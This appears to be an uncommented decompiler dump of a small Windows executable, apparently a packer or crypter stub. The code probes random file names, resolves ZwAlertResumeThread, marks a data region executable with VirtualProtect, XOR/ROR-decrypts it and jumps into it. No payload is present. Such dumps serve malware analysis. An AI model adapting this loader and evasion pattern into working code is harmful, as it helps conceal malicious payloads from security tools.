/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// void __usercall __noreturn sub_401024(char a1@<cf>, __int16 _DX@<dx>, _BYTE *a3@<ecx>, int _ESI@<esi>);
// void __usercall __noreturn start(int a1@<esi>);
_DWORD *__stdcall sub_4155E8(unsigned int a1, int a2, _DWORD *a3);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// DWORD __stdcall GetFileType(HANDLE hFile);
// HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// DWORD __stdcall GetLastError();
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// LPSTR __stdcall GetCommandLineA();
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

//-------------------------------------------------------------------------
// Data declarations

int dword_401000[9] =
{
  2120588011,
  -61567226,
  1866615635,
  -58879550,
  -1788515636,
  1222331712,
  -2064826628,
  2004860167,
  -8236025
}; // weak
_UNKNOWN loc_4154AB; // weak
CHAR ModuleName[] = "NTDLL.DLL"; // idb
CHAR aXwjd7utdfeuzai[] = "XWJD7utDfeuzAI.F5p"; // idb
WCHAR a2foO9a[] = L"\u4632\u2E4F\u396FA"; // idb
CHAR aQYke[] = "q.yKE"; // idb
WCHAR aQp3ikpnodC2e[] = L"\u7071\u4933\u704B\u4F4E\u2E64\u3263e"; // idb
WCHAR aXqceiiBng[] = L"\u7158\u4563\u6969\u622E\u476E"; // idb
WCHAR aFs7zl6acsju4zw[] = L"\u5366\u7A37\u364C\u4361\u4A53\u3475\u775A\u4656\u4158\u6E44\u4C45\u482E\u4933"; // idb
CHAR FileName[] = ".HK4"; // idb
CHAR aWssvldekkKoz[] = "WSsVLdEkK.KoZ"; // idb
WCHAR aRucbbonw475fhi[] = L"\u5572\u4263\u4F42\u574E\u3734\u6635\u6948\u7637\u7970\u4F32\u7A32\u5445\u2E35\u4131H"; // idb
WCHAR aK0owvjcyjpmjgg[] = L"\u304B\u574F\u4A56\u5963\u504A\u4A6D\u6767\u6E4C\u4466\u5953\u6773\u6551\u792E\u6454"; // idb
WCHAR aJ04h6lf24Dhj[] = L"\u304A\u6834\u6C36\u3266\u2E34\u4844j"; // idb
CHAR aNnyooxGxk[] = "nnYOOx.Gxk"; // idb
CHAR ProcName[] = "ZwAlertResumeThread"; // idb
CHAR aL9ik0Fq6[] = "L9Ik0.fQ6"; // idb


//----- (00401024) --------------------------------------------------------
void __usercall __noreturn sub_401024(char a1@<cf>, __int16 _DX@<dx>, _BYTE *a3@<ecx>, int _ESI@<esi>)
{
  *a3 -= a1 + BYTE1(a3);
  __asm
  {
    outsd
    insd
  }
  JUMPOUT(0xAEC62F66);
}
// 40103D: control flows out of bounds to AEC62F66

//----- (004151C1) --------------------------------------------------------
void __usercall __noreturn start(int a1@<esi>)
{
  HANDLE v1; // eax
  char v2; // cf
  __int16 v3; // dx
  _BYTE *v4; // ecx
  DWORD v5; // [esp-14h] [ebp-5Ch]
  struct _SECURITY_ATTRIBUTES *v6; // [esp-10h] [ebp-58h]
  DWORD v7; // [esp-Ch] [ebp-54h]
  DWORD v8; // [esp-8h] [ebp-50h]
  HANDLE v9; // [esp+0h] [ebp-48h]
  NTSTATUS (__stdcall *ZwAlertResumeThread)(HANDLE, PULONG); // [esp+10h] [ebp-38h]
  int v11; // [esp+14h] [ebp-34h]
  HANDLE hObject; // [esp+20h] [ebp-28h]
  HMODULE hModule; // [esp+24h] [ebp-24h]
  DWORD flOldProtect[2]; // [esp+28h] [ebp-20h] BYREF
  HANDLE v15; // [esp+30h] [ebp-18h]
  HANDLE hFile; // [esp+34h] [ebp-14h]
  HANDLE v17; // [esp+38h] [ebp-10h]
  HANDLE v18; // [esp+3Ch] [ebp-Ch]
  HANDLE v19; // [esp+40h] [ebp-8h]
  HANDLE v20; // [esp+44h] [ebp-4h]

  GetCommandLineA();
  GetLastError();
  GetCommandLineA();
LABEL_2:
  GetCommandLineA();
  hFile = CreateFileA(FileName, 0x80000000, 4u, 0, 3u, 0x20u, 0);
  GetFileSize(hFile, 0);
  while ( 1 )
  {
    GetLastError();
    CloseHandle(hFile);
    GetLastError();
    GetFileType(hFile);
    v8 = 167;
    v7 = 3;
    v6 = 0;
    v5 = 7;
LABEL_4:
    hObject = CreateFileA(aQYke, 0x80000000, v5, v6, v7, v8, 0);
    do
    {
      if ( CreateFileA(aNnyooxGxk, 0, 6u, 0, 3u, 0x1A1u, 0) != (HANDLE)-1 )
        goto LABEL_2;
      GetCommandLineA();
      CreateFileW(a2foO9a, 0x20000000u, 7u, 0, 3u, 0xA3u, 0);
      hModule = GetModuleHandleA(ModuleName);
      v20 = CreateFileW(aXqceiiBng, 0xC0000000, 4u, 0, 3u, 0x82u, 0);
    }
    while ( v20 != (HANDLE)-1 );
    GetFileSize(hObject, 0);
    if ( CreateFileW(aFs7zl6acsju4zw, 0xC0000000, 3u, 0, 3u, 0x101u, 0) == (HANDLE)-1 )
    {
      CloseHandle(hObject);
      CloseHandle((HANDLE)0xFFFFFFFF);
      ZwAlertResumeThread = (NTSTATUS (__stdcall *)(HANDLE, PULONG))GetProcAddress(hModule, ProcName);
      v19 = CreateFileW(aK0owvjcyjpmjgg, 0x20000000u, 2u, 0, 3u, 5u, 0);
      if ( v19 == (HANDLE)-1 )
      {
        GetLastError();
        v9 = CreateFileW(aJ04h6lf24Dhj, 0xE0000000, 7u, 0, 3u, 0x127u, 0);
        GetFileSize(v9, 0);
        GetFileType(v19);
        v15 = CreateFileA(aWssvldekkKoz, 0xE0000000, 6u, 0, 3u, 0x121u, 0);
        if ( v15 == (HANDLE)-1 )
        {
          v8 = 0;
          GetFileSize((HANDLE)0xFFFFFFFF, 0);
          v11 = ((int (*)(void))ZwAlertResumeThread)();
        }
        GetCommandLineA();
        v1 = CreateFileA(aXwjd7utdfeuzai, 0x40000000u, 5u, 0, 3u, 0x25u, 0);
        do
        {
          flOldProtect[1] = (DWORD)v1;
          if ( v1 != (HANDLE)-1 )
            goto LABEL_4;
          ((void (*)(void))((char *)&loc_4154AB + (v11 ^ 0xC0000008)))();
          v7 = (DWORD)flOldProtect;
          v1 = CreateFileW(aRucbbonw475fhi, 0xE0000000, 2u, 0, 3u, 0x186u, 0);
        }
        while ( v1 != (HANDLE)-1 );
        GetLastError();
        GetFileType(v15);
        CloseHandle(v9);
        VirtualProtect(dword_401000, 0x141A9u, 0x40u, flOldProtect);
      }
      GetCommandLineA();
      v17 = CreateFileA(aL9ik0Fq6, 0x20000000u, 4u, 0, 3u, 0xA6u, 0);
      GetCommandLineA();
      CloseHandle(v20);
      v18 = CreateFileW(aQp3ikpnodC2e, 0xC0000000, 5u, 0, 3u, 0xA4u, 0);
      ((void (__cdecl *)(int, int, int *))((char *)sub_4155E8 + v11 + 1073741816))(82345, v11, dword_401000);
      sub_401024(v2, v3, v4, a1);
    }
  }
}
// 415257: variable 'v5' is possibly undefined
// 415257: variable 'v6' is possibly undefined
// 415257: variable 'v7' is possibly undefined
// 415257: variable 'v8' is possibly undefined
// 41545D: variable 'v11' is possibly undefined
// 4155B6: variable 'v2' is possibly undefined
// 4155B6: variable 'v3' is possibly undefined
// 4155B6: variable 'v4' is possibly undefined
// 401000: using guessed type int dword_401000[9];

//----- (004155E8) --------------------------------------------------------
_DWORD *__stdcall sub_4155E8(unsigned int a1, int a2, _DWORD *a3)
{
  unsigned int v3; // edx
  _DWORD *result; // eax

  v3 = a1 >> 2;
  result = a3;
  do
  {
    *result ^= a2;
    *result ^= a2;
    *result = __ROR4__(*result, 132);
    *result ^= 0x8C74B72B;
    *result ^= 0xA64D6414;
    *result ^= a2;
    *result -= 1824889053;
    *result ^= a2;
    *result++ ^= a2;
    --v3;
  }
  while ( v3 );
  return result;
}

// nfuncs=3 queued=3 decompiled=3 lumina nreq=0 worse=0 better=0
// ALL OK, 3 function(s) have been successfully decompiled
